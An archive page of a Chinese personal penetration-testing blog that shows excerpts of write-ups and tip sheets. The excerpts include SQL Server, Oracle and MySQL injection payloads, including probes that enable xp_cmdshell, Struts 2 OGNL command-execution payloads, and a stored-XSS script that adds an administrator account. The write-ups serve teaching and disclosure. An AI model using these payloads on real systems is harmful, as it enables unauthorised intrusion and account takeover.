
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pentest - Reber's Blog</title>
    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
    <meta name="author" content="reber">
    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
    <!--[if lte IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
    <![endif]-->
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
    <!--<![endif]-->
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    <link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css">
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
    <script src="/js/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <script src="/js/jquery.min.js"></script>
</head>
<body>



<div class="reber">
    
<div class="head">
    <h1 class="logo" id="logo">
        <a href="/"><img src='/img/logo.png' width='70px'></a>
    </h1>
    <ul class="nav">
        
            
                <li>
                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
            
                </li>
        
            
                <li>
                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
            
                </li>
        
            
                <li>
                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
            
                </li>
        
    </ul>
</div>

    
    <div class="main">
        <div class="left">
            
            <div class="content">
                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/">从 SQL Server 注入到 远程连接桌面</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2019-06-25
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/pentest">pentest</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 目标情况  只有一个登录框  0x01 发现注入 简单看了下登陆框，可以爆破用户名
加单引号后报错，试了试 and 1=1 确实存在注入
0x01 进一步测试 尝试得到数据版本: admin' and @@version=1-- 抓包 sqlmap 跑了下发现不行: sqlmap -r 1.txt --risk 3 --level 3 --dbms &quot;Microsoft SQL Server&quot; --second-order &quot;http://123.xxx.xxx.180:2001/error.aspx&quot;
返回: all tested parameters appear to be not injectable，跑不出来，只能手工了
看下能不能多语句执行: admin';select convert(int,(select user));--
结果发现可以执行成功，能进行多语句执行 0x02 尝试多语句执行添加用户  查看是否有 xp_cmdshell
Payload：admin';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:5';--  开启 xp_cmdshell
    </p>

    
    <footer>
        <a href="/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/">从 SQL Server 注入到 getshell</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2019-03-02
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/pentest">pentest</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/getshell">getshell</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&lt;也可用sqlmap的&ndash;is-dba判断&gt;)  uname=test';if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2';--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test';if(host_name()=@@servername) WAITFOR DELAY '0:0:5';--   查看是否有xp_cmdshell  uname=test';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:2'--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname='xplog70.
    </p>

    
    <footer>
        <a href="/posts/2019/sql-server-from-injection-to-getshell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2019/injection-tips-of-oracle/">SQL注入tips(Oracle)</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2019-01-04
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/oracle">oracle</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 判断数据库类型  Oracle有一些自带的表：dual、user_tables
 id=45 and (select count(*) from user_tables)&gt;0-- id=45 and (select count(*) from dual)&gt;0--  利用自带的一些函数：譬如utl_http.request 这些
 利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)
  0x01 基本信息获取  查看sid
select instance_name from v$instance;  查看数据库版本：
select banner from v$version where rownum=1; select banner from sys.v_$version where rownum=1;  查看用户：
select user from dual; --当前用户 select username from user_users; --当前用户 select username from all_users; --查看所有用户 select username from dba_users; --查看所有用户(需要有权限)  查看当前用户角色：
    </p>

    
    <footer>
        <a href="/posts/2019/injection-tips-of-oracle/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">记一次SQL Server报错注入</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-12-24
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
用户不存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;用户名不存在！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
用户名存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;密码不正确！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
可以的，验证码前端验证，我觉得可以burp抓包intruder一下
跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad
0x01 存在注入 嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！ 可以的，and 1=1 有注入
哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？
刚才看了数据包，用户名密码都是32位，猜想sql语句是：select password from user where username=name_md5_hash，然后判断用户存不存在之类的
看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。
试试post其他用户名和密码，然后看数据包 显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个 emmmmm，想了想，应该可以注入的，看看啥系统 大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server 看看数据库版本，嗯，看来还是报错注入 可以可以，看看有几列，然后进行union注入 一列，这里也能大致猜出来sql语句了，估计就是：select password from user where username='admin'
那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。
得到第一个数据库的名字：union select name from master.dbo.sysdatabases where dbid=1 得到第二个数据库的名字：union select name from master.dbo.sysdatabases where dbid=2 得到第5个数据库的名字：union select name from master.dbo.sysdatabases where dbid=5 好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。
py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入
    </p>

    
    <footer>
        <a href="/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/recording-an-xss-in-pentest/">记一次渗透测试中利用存储型XSS添加用户</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-11-14
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/xss">xss</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         $(document).ready(function(){ window.location.href='/404.html'; });  ``` ![80](/img/post/20181114-121432.png) 当用户yxk浏览用户申请列表页面时触发XSS ![80](/img/post/20181114-121938.png) 回到reber用户，可以看到已经加入了yxk的组织，可以进行一些操作了 ![80](/img/post/20181114-122147.png) ### 0x05 更进一步，添加为管理员 刚开始分析发现通过上面的过程先添加用户，然后再添加用户为管理员，比较麻烦 后续发现其实不用这么麻烦，直接用另外一个接口发送ajax请求就能直接添加管理员用户 添加管理员的2.js如下： ``` function get_gid(){ $.ajax({ type: 'post', url: '/a/cms/group/treeNode', dataType: 'json', async: false, data: 'parentId=0', success: function(data){ gid = data[0]['dataObject']['topGroupId']; } }); return gid; } var gid = get_gid(); $.post('/a/cms/member/do.save',{memberId: 0,userId: '',mobile: '176004****',name: 'aaa',pinyin: 'aaa',groupId: 608863,group: '默认分组',roleId: 2,duty: '',sex: 0,sort: '10000','TEL;CELL': '','TEL;WORK': '',EMAIL: ''}); ``` 提交验证信息为：```test``` 当yxk访问请求的list页面时即可直接添加新用户aaa到group并且是管理员账户： ![80](/img/post/20181114-123006.png) 好了，打完收工！  PS：漏洞已提交，并早在3个月前修复 -- 
    </p>

    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/responder-and-ntlm-hash/">内网渗透之 Responder 与 Net-NTLM hash</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-09-10
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 一些概念  Windows 认证协议
分为：基于 NTLM 的认证和基于 kerberos 的认证
 什么是 NTLM Hash？
早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash
 什么是 Challenge-Response 挑战/响应验证机制？
 Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证  NTLM Hash 与 Net-NTLM Hash
    </p>

    
    <footer>
        <a href="/posts/2018/responder-and-ntlm-hash/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/injection-tips-of-sqlserver/">SQL注入tips(SQL Server)</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-09-04
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&lt;01&gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysadmin')));   得到所有数据库名字   --得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 id=1 and 0&lt;&gt;(select name from master.
    </p>

    
    <footer>
        <a href="/posts/2018/injection-tips-of-sqlserver/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/php-session-deserialize/">关于 PHP SESSION 反序列化</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-07-23
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/php">php</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/deserialize">deserialize</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。
其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题
我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。
reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 reber@wyb:~$ html php --version PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb 9 2017 20:54:58) Copyright (c) 1997-2014 The PHP Group Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies reber@ubuntu-linux:~$ apachectl -v Server version: Apache/2.
    </p>

    
    <footer>
        <a href="/posts/2018/php-session-deserialize/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/">Struts 2相关漏洞payload</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-06-25
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/rce">rce</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。  %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  0x01 S2-005 影响版本: 2.0.0 - 2.1.8.1
http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1  0x02 S2-007 影响版本: 2.0.0 - 2.2.3
当配置了验证规则 &lt;ActionName&gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。  ' + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '  0x03 S2-012 影响版本: 2.1.0 - 2.3.13
这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。  %{#a=(new java.lang.ProcessBuilder(new java.
    </p>

    
    <footer>
        <a href="/posts/2018/structs2-some-vulnerability-payload/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/injection-tips-of-mysql/">SQL注入tips(MySQL)</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-05-23
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        环境：MySQL 5.5.47
0x00 注入点在Order by后面 mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt'; Query OK, 1 row affected (0.01 sec)  mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~msg~'  mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: '~rtest~'  mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2)); +----------+ | name | +----------+ | xiaohong | +----------+ 1 row in set (0.
    </p>

    
    <footer>
        <a href="/posts/2018/injection-tips-of-mysql/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                

                


    
    
    <nav class="pagination" role="pagination">
        
            <a href="/topics/pentest/"><i class="fa fa-chevron-left"></i></a>
        

        <span>&nbsp;2 / 9&nbsp;</span>
        
        
            <a href="/topics/pentest/page/3/"><i class="fa fa-chevron-right"></i></a>
        
    </nav>


            </div>
        </div>
        <div class="right">
            

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Categorie<a href="/single/index.html" class="single" target="_blank">s</a></h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/database" title="database">database(10)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/git" title="git">git(4)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/linux" title="linux">linux(25)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/other" title="other">other(13)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/php" title="php">php(12)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/python" title="python">python(24)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/server" title="server">server(10)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/windows" title="windows">windows(2)</a>
            </li>
        
    </ul>


</div>
            

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Tags</h2>
    <div class="taglist" id="tags">
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/ajax" title="ajax">ajax</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/cgi" title="cgi">cgi</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/csrf" title="csrf">csrf</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/des" title="des">des</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/dmz" title="dmz">dmz</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/docker" title="docker">docker</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/getshell" title="getshell">getshell</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/git" title="git">git</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/https" title="https">https</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/injection" title="injection">injection</a>
                <sup>18</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/intranet" title="intranet">intranet</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/javascript" title="javascript">javascript</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/linux" title="linux">linux</a>
                <sup>10</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/mindmap" title="mindmap">mindmap</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/module" title="module">module</a>
                <sup>7</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/mysql" title="mysql">mysql</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
